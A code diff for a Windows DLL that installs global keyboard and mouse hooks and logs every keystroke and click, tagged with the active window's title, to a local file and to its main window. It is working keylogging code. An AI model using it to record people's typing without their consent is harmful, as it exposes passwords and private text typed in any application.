@@ -9,14 +9,34 @@ HHOOK hMouseHook = NULL;
 Logger logger("logs"); 
 POINT lastMousePos = { 0 };
 
-// 实时同步日志到主界面
-void SendLogToUI(const std::string& logEntry) {
-    if (Config::hMainWnd == NULL) return;
-    COPYDATASTRUCT cds;
-    cds.dwData = 1; 
-    cds.cbData = (DWORD)logEntry.size() + 1;
-    cds.lpData = (PVOID)logEntry.c_str();
-    SendMessageA(Config::hMainWnd, WM_COPYDATA, (WPARAM)NULL, (LPARAM)&cds);
+// 获取功能键的可读名称
+std::string GetVirtualKeyName(WPARAM vkCode) {
+    switch (vkCode) {
+        case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL: return "Ctrl";
+        case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT: return "Shift";
+        case VK_LMENU: case VK_RMENU: case VK_MENU: return "Alt";
+        case VK_LWIN: case VK_RWIN: return "Win";
+        case VK_ESCAPE: return "Esc";
+        case VK_CAPITAL: return "CapsLock";
+        case VK_TAB: return "Tab";
+        case VK_BACK: return "Backspace";
+        case VK_RETURN: return "Enter";
+        case VK_SPACE: return "Space";
+        case VK_PRIOR: return "PageUp";
+        case VK_NEXT: return "PageDown";
+        case VK_END: return "End";
+        case VK_HOME: return "Home";
+        case VK_LEFT: return "Left";
+        case VK_UP: return "Up";
+        case VK_RIGHT: return "Right";
+        case VK_DOWN: return "Down";
+        case VK_INSERT: return "Insert";
+        case VK_DELETE: return "Delete";
+        default:
+            if (vkCode >= VK_F1 && vkCode <= VK_F12) 
+                return "F" + std::to_string(vkCode - VK_F1 + 1);
+            return "Unknown";
+    }
 }
 
 std::string GetActiveWindowTitleStr() {
@@ -35,25 +55,27 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
             
-            // 键盘状态转真实字符
             BYTE keyState[256];
             GetKeyboardState(keyState);
+            keyState[VK_SHIFT] = GetKeyState(VK_SHIFT);
+            keyState[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
+
             wchar_t wch[5];
             int res = ToUnicode(p->vkCode, p->scanCode, keyState, wch, 4, 0);
-            
+
             char buf[512];
-            std::string winName = GetActiveWindowTitleStr();
-            if (res > 0) {
+            std::string windowName = GetActiveWindowTitleStr();
+            
+            if (res > 0) { // 如果是 ASCII 或可见字符
                 wch[res] = L'\0';
                 char utf8Char[16];
                 WideCharToMultiByte(CP_UTF8, 0, wch, -1, utf8Char, 16, NULL, NULL);
-                sprintf_s(buf, "[%s] Char: %s", winName.c_str(), utf8Char);
-            } else {
-                sprintf_s(buf, "[%s] KeyCode: %d", winName.c_str(), p->vkCode);
+                sprintf_s(buf, "[%s] Key: %s", windowName.c_str(), utf8Char);
+            } else { // 否则显示功能键名称
+                std::string keyName = GetVirtualKeyName(p->vkCode);
+                sprintf_s(buf, "[%s] Special: [%s]", windowName.c_str(), keyName.c_str());
             }
-            
-            logger.log(buf);
-            SendLogToUI(buf);
+            logger.log(buf); // 内部会发送 WM_COPYDATA
         }
     }
     return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
@@ -67,7 +89,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
         else if (wParam == WM_RBUTTONDOWN) action = "Right Click";
         else if (wParam == WM_MOUSEMOVE) {
             int dx = p->pt.x - lastMousePos.x, dy = p->pt.y - lastMousePos.y;
-            if (abs(dx) > 10 || abs(dy) > 10) {
+            if (abs(dx) > 15 || abs(dy) > 15) {
                 char mbuf[64]; sprintf_s(mbuf, "Move: %d,%d", dx, dy);
                 action = mbuf; lastMousePos = p->pt;
             }
@@ -76,7 +98,6 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
             char buf[512];
             sprintf_s(buf, "[%s] %s", GetActiveWindowTitleStr().c_str(), action.c_str());
             logger.log(buf);
-            SendLogToUI(buf);
         }
     }
     return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
@@ -84,7 +105,6 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 extern "C" __declspec(dllexport) void SetRecordConfig(bool k, bool m, const wchar_t* t) {
     Config::recordKeyboard = k; Config::recordMouse = m;
-    if (t) wcscpy_s(Config::targetWindowTitle, t);
 }
 
 extern "C" __declspec(dllexport) void InstallHook() {
@@ -96,4 +116,5 @@ extern "C" __declspec(dllexport) void InstallHook() {
 extern "C" __declspec(dllexport) void UninstallHook() {
     if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
     if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
+    hKeyboardHook = NULL; hMouseHook = NULL;
 }
